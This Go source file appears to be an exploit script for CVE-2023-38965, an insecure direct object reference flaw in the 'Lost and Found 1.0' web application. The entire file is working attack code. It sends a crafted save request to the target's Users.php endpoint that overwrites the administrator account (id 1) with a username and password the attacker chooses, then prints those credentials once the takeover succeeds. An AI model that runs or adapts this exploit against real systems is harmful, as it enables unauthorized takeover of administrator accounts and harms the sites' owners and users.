package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"time"

	"github.com/akamensky/argparse"
)

func main() {

	fmt.Println("//////////////////////////chaossec/////////////////////////////////////")
	parser := argparse.NewParser("cve-2023-38965", "Exploits an IDOR takeover in Lost and Found 1.0")
	url := parser.String("u", "url", &argparse.Options{Required: true, Help: "URL of the target"})

	user := parser.String("n", "username", &argparse.Options{Required: true, Help: "Username"})
	password := parser.String("p", "password", &argparse.Options{Required: true, Help: "Password"})

	// Parse input
	err := parser.Parse(os.Args)
	if err != nil {
		// In case of error print error and print usage
		// This can also be done by passing -h or --help flags
		fmt.Print(parser.Usage(err))
	}
	*url += "/classes/Users.php?f=save"

	postBody, _ := json.Marshal(map[string]string{

		"id":         "1",
		"firstname":  "or4ng",
		"middlename": "",
		"lastname":   "Admin",
		"username":   *user,
		"password":   *password,
	})

	responseBody := bytes.NewBuffer(postBody)
	resp, err := http.Post(*url, "application/json", responseBody)
	//Handle Error
	if err != nil {
		log.Fatalf("An Error Occured %v", err)
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatalln(err)
	}
	bodyString := string(body)

	if bodyString == "1" {
		fmt.Println("Exploit ..")
		time.Sleep(600)
		fmt.Println("User :" + *user + "\nPassword :" + *password)
	} else {
		fmt.Println("Exploit failed....")
	}
}
